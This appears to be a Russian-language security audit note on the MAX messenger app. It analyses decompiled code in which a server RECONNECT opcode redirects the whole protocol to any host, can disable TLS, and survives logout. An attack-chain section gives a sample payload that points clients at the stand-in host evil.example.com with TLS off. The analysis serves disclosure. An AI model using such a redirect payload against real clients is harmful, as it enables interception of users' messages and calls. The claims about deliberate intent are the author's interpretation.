---
tags: [critical, ws-protocol, reconnect, persistence, tls-downgrade, server-takeover, mitm, no-validation]
status: verified
severity: critical
sources:
  - work/jadx_base/sources/defpackage/fef.java
  - work/jadx_base/sources/defpackage/pb8.java
  - work/jadx_base/sources/defpackage/ri9.java
  - work/jadx_base/sources/defpackage/yag.java
  - work/jadx_base/sources/defpackage/f4.java
  - work/jadx_base/sources/defpackage/tk6.java
  - work/jadx_base/sources/defpackage/jvk.java
  - work/jadx_base/sources/defpackage/m86.java
  - work/jadx_base/sources/defpackage/u0d.java
  - res/xml/network_security_config.xml
related:
  - "[[20-ws-protocol-opcodes]]"
  - "[[221-network-security-config]]"
  - "[[52-network-session-tls-flags]]"
  - "[[533-doh-c2-endpoint-redirect]]"
  - "[[542-traceflow-dps-deanonymization]]"
  - "[[544-debug-ws-opcode-c2-channel]]"
---

# 543. WS-опкод RECONNECT (код 3) — server-side такеовер всего протокола без валидации

## Суть

Сервер одной WS-нотификацией опкода 3 переписывает на устройстве пользователя **домен и порт основного MAX-протокола**, а также может **отключить TLS** (`tls=false`). Никакой валидации `redirectHost` не делается — нет whitelist, нет regex по домену, нет certificate pinning, нет уведомления пользователя. Запись делается напрямую в SharedPreferences `{userId}_user_prefs.xml` под ключами `server.host` / `server.port` / `server.useTls`. Эти значения **переживают полный logout** — в `ri9.c()` явно реализована конструкция «сохранить → super.c() (clear all) → восстановить server.\*». Через RECONNECT сервер получает persistent захват клиента: весь основной протокол (159 опкодов, сообщения, звонки, sync) перенаправляется на произвольный хост в чистом виде на raw TCP.

## Что приходит от сервера

WS-нотификация опкода 3 (`u0d.RECONNECT`):

```
{
  "redirectHost": "anything:port",   // произвольная строка
  "tls":          false              // boolean, можно отключить TLS
}
```

Парсер в `defpackage/fef.java`:

```java
public final class fef extends jei {
    public String c;     // redirectHost
    public boolean d;    // tls — default true

    public final void c(kxa kxaVar, String str) {
        if (str.equals("tls"))           this.d = kxaVar.L0();
        else if (str.equals("redirectHost")) this.c = j8h.U(kxaVar);
        else                              kxaVar.C();   // skip unknown
    }
    public final String d() { return this.c.substring(0, this.c.indexOf(":")); }
    public final String e() { return this.c.substring(this.c.indexOf(":") + 1); }
}
```

**Никаких проверок.** Парсер берёт строку как есть, разбивает по первому двоеточию.

## Обработчик — `pb8.java`, ветка `s == 3`

```java
if (s == 3) {
    fef fefVar = (fef) jeiVar;
    if (fefVar.c.length() > 0) {
        ri9 ri9 = yzbVar4.a().a;
        ri9.q0.y(ri9, ri9.f1[3], fefVar.d());                     // server.host
        yzbVar4.a().a.Y(fefVar.e());                               // server.port
        ri9 ri9_2 = yzbVar4.a().a;
        ri9_2.s0.y(ri9_2, ri9.f1[5], Boolean.valueOf(fefVar.d));  // server.useTls
    }
    // Перезапуск соединения
    ((pwb) ((vei) ueiVar3.C0.getValue()).X.get()).v(false);
    ((ExecutorService) ueiVar3.F0.getValue()).execute(new nei(0, ueiVar3));
}
```

Отсутствуют:
- whitelist легитимных доменов
- regex по доменному имени (e.g. `\.oneme\.ru$`)
- проверка наличия в системных DNS-записях
- certificate pinning (для основного протокола pinning отсутствует в принципе — см. [[wave1/07-crypto-audit]])
- UI-уведомление пользователя
- какое-либо логирование в видимое место (только во внутренний лог `ct4.E`)

## Хранение — `{userId}_user_prefs.xml`

Класс `ri9` (extends `yag` extends `f4`) пишет в SharedPreferences файл:

```
/data/data/ru.oneme.app/shared_prefs/{userId}_user_prefs.xml
```

Ключи:

| Ключ | Тип | Default |
|---|---|---|
| `server.host` | String | `null` (fallback на `api.oneme.ru` в `tk6.java`) |
| `server.port` | String | `null` |
| `server.useTls` | Boolean | `true` |

Это **обычные SharedPreferences-ключи**, а не PmsKey — они не передаются в общем `cb4` Configuration-объекте, а имеют отдельный канал записи через RECONNECT-опкод.

## Persistence через logout — подтверждено

Override `ri9.c()`:

```java
public final void c() {
    // 1. сохранить текущие значения в локалки
    String host  = L();   // server.host
    String port  = M();   // server.port
    boolean tls  = O();   // server.useTls
    // ... ещё ~20 полей ...

    // 2. очистить ВСЕ prefs
    super.c();            // → f4.c() → SharedPreferences.edit().clear().apply()

    // 3. ВОССТАНОВИТЬ server.host / port / useTls
    this.q0.y(this, h29VarArr[3], host);
    Y(port);
    this.s0.y(this, h29VarArr[5], Boolean.valueOf(tls));
    // ...
}
```

Это **явная** реализация «выживет logout» — не побочный эффект, а намеренная конструкция. Метод вызывается из `gn9.java:149` → `f3e.a()`, то есть на стандартном logout-flow. После logout + повторной авторизации клиент **снова** подключается к указанному ранее хосту.

Сбрасывается только полным `Settings → Apps → MAX → Clear Data` или новым RECONNECT с легитимным хостом.

## TLS downgrade при `tls=false` — работает

Основной WS-протокол использует **raw TCP socket** (через `tk6` → `jvk`), а не HttpURLConnection. Поэтому `NetworkSecurityPolicy.isCleartextTrafficPermitted()` **не проверяется автоматически**.

В `jvk.c()`:
```java
if (!(socketCreateSocket instanceof SSLSocket)) {
    // "connectTls, no tls required for" — propagated через ue4(host, port, useTls)
    return socketCreateSocket;     // plain socket — TLS НЕ применяется
}
```

`network_security_config.xml` разрешает cleartext только для шести Mobile ID доменов операторов:

```xml
<domain-config cleartextTrafficPermitted="true">
    <domain>mobileid.megafon.ru</domain>
    <domain>idgw.mobileid.mts.ru</domain>
    <domain>hhe.mts.ru</domain>
    <domain>he-mc.tele2.ru</domain>
    <domain>he-mc.t2.ru</domain>
    <domain>balance.beeline.ru</domain>
</domain-config>
```

Но эта политика — **подсказка для HTTP-стека**. Raw TCP socket в `jvk` обходит её, потому что приложение «само знает что делает».

Итог: после RECONNECT(`tls=false`) **весь WS-трафик идёт в открытом виде**.

## Scope — что именно перенаправляется

`ri9.serverHost` читается в `tk6.java` как endpoint **основного TCP-протокола**, через который идут все 159 WS-опкодов:

| Категория | Что перенаправляется |
|---|---|
| Сообщения | `NOTIF_MESSAGE`, `MSG_SEND`, `NOTIF_MSG_DELETE`, edit, react, draft, transcribe |
| Звонки | `NOTIF_CALL_START`, signaling, sub-notifications (switch-micro, record-started, asr-started, topology-changed) |
| Синхронизация | контакты, чаты, профили, presence, folders, stickers |
| Авторизация | login, sessions, 2FA, recovery |
| Конфигурация | NOTIF_CONFIG (PmsKey + serverSettings + experiments) |

То есть сервер по RECONNECT захватывает **весь** канал данных мессенджера. HTTP API (загрузка файлов, attachments) идёт отдельно через `api.oneme.ru` hardcoded в `yc9` — это не перенаправляется. Но WS — это основной канал данных.

## ServerHostSelector / whitelist — не существует

Поиск по `ServerHostSelector` / `serverHostSelector` / `server_host_selector` в jadx-декомпиляции не находит механизма автоматической ротации с валидацией. Существует только UI DevMenu `ServerHostBottomSheet` (`one.me.devmenu.tools.server`) для **ручной** смены сервера разработчиком. Этот UI выдаёт фиксированный список (`api.oneme.ru`, `api-test.oneme.ru`, `api-tg.oneme.ru`, `api-test2.oneme.ru`, Custom), но опкод RECONNECT этот список **игнорирует**.

Единственная «валидация» формата URL в коде — `m86.a` regex `^[a-zA-Z][a-zA-Z0-9+.-]*://\S+$` — используется для calls-WS (signaling), не для основного протокола. И проверяет только что строка вообще является URL.

## Цепочка атаки

```
1. Сервер шлёт WS opcode 3:
   { "redirectHost": "evil.example.com:8080", "tls": false }

2. Клиент:
   - SharedPreferences {uid}_user_prefs.xml
       server.host  = "evil.example.com"
       server.port  = "8080"
       server.useTls = false
   - Перезапуск WS-соединения

3. tk6 → jvk:
   - new ue4("evil.example.com", "8080", useTls=false)
   - Plain TCP socket к evil.example.com:8080
   - Никакого TLS

4. Все 159 опкодов идут на evil.example.com в открытом виде:
   - Сообщения plaintext (E2E нет)
   - Сигналинг звонков
   - Контакты, presence, чаты

5. Logout → ri9.c() сохраняет и восстанавливает server.host
6. Повторный логин → подключение опять на evil.example.com

7. Пользователь не получает никаких уведомлений и UI-индикации.
```

## Где это сочетается с другими находками

- **DoH C2 redirect (topic 533)** — `dns.google.com/resolve` для TXT-записи `api._endpoint.ok.ru` уже даёт серверу способ передать новый endpoint без обновления приложения. RECONNECT — это второй, более прямой канал того же эффекта.
- **QUIC null TrustManager (topic 537)** — для QUIC-канала certificate validation отключён. Здесь, в основном TCP-протоколе, certificate pinning тоже отсутствует — вместе они закрывают оба способа доставки данных.
- **DEBUG opcode (topic 544)** — после RECONNECT сервер контролирует, кто получает SYNC_CONTACTS / SEND_LOG.
- **trace-flow.ru DPS (topic 542)** — сервер DPS знает, какие хосты доступны с устройства; в комбинации с RECONNECT — может выбрать host:port, который точно проходит у конкретного пользователя.

## Почему «без валидации» — это сознательное решение, а не баг

1. Структура `fef` максимально упрощена — только 2 поля (`redirectHost` + `tls`). Не пропущена валидация по забывчивости — её просто нет в дизайне.
2. `ri9.c()` явно сохраняет именно эти три ключа — это код, написанный с пониманием того, что такие данные не должны теряться при logout.
3. Поле `tls=false` имеет смысл только при намерении принять plain TCP. В нормальной архитектуре была бы проверка whitelisted-сабнета или подписанной цепочки. Её нет.

## Сравнение с защищёнными аналогами

| Механизм | Защита от RECONNECT-такеовера |
|---|---|
| Telegram (MTProto) | Hardcoded master public key, валидация подписи DC redirect |
| Signal | Endpoint hardcoded в коде, certificate pinning |
| Matrix (Element) | `.well-known` на исходном homeserver, не доверяет серверу новый endpoint |
| **MAX** | **Никакой проверки. Любой redirectHost принимается.** |

## Статус в 26.16.0

Без изменений. `fef.smali` присутствует, обработчик в `pb8.smali` сохранён, поля `server.host` / `server.port` / `server.useTls` остались в `ri9`/`yag`. Никакой ремонт под публичное давление эту дыру не закрыл.

## Файлы

- `defpackage/fef.java` — парсер RECONNECT
- `defpackage/pb8.java` — обработчик ветки `s == 3`
- `defpackage/ri9.java` — хранение server.* в SharedPreferences + override `c()` (logout-resistance)
- `defpackage/tk6.java` — создание TCP-сокета по `server.host`
- `defpackage/jvk.java` — пропуск TLS при `useTls=false`
- `defpackage/u0d.java:Y` — enum значение `RECONNECT = 3`
- `notes/wave2/03-reconnect-persistence.md` — полная верификация

---

**Вывод одной строкой:** RECONNECT — это серверный кран для перенаправления всего MAX-протокола конкретного пользователя на любой хост в любой сети с отключённым TLS, переживающий logout и перезапуск. Это не функция «миграции на новый дата-центр» (ни проверок, ни telemetry, ни graceful migration), это **средство адресного MITM** на стороне сервера.
